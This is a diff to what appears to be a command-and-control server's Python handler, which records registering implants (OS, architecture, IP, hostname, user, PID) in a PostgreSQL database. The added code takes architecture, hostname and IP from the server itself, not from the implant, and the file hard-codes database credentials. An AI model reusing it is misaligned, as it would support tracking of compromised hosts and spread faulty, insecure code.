@@ -2,6 +2,7 @@
 import threading
 import sys
 import os
+import socket
 from queue import Queue
 from pb import implantpb_pb2
 
@@ -28,6 +29,11 @@ class Handler:
             self.readRegistration(data, addr)
 
     def readRegistration(self, data: bytes, addr):
+        # Get implant info - used by line 49
+        implant_arch = os.uname().machine
+        implant_host = socket.gethostname()
+        implant_ip = socket.gethostbyname(implant_host)
+
         # Parse the incoming data
         message = implantpb_pb2.Message()
         message.ParseFromString(data)
@@ -40,11 +46,15 @@ class Handler:
             # Connect to SQLAlchemy engine
             engine = create_engine('postgresql+psycopg2://postgres:password@localhost:5432/test_db')
             session = Session(engine)
-            implant = Implants(OS = registration.os, Arch = "TODO", IPv4 = "TODO", Hostname = "TODO", \
+            implant = Implants(OS = registration.os, Arch = implant_arch, IPv4 = implant_ip, Hostname = implant_host, \
                                Username = registration.user.name, PID = registration.pid)
             session.add(implant)
             session.commit()
             session.close()
+
+            #pid = 12345
+            #formatted_pid = "{:05d}".format(pid)  # pads with zeros to a width of 5
+            #print(formatted_pid)  # outputs "12345"
 
             # TODO: Log this part here instead of printing to stdout
             display = f"""
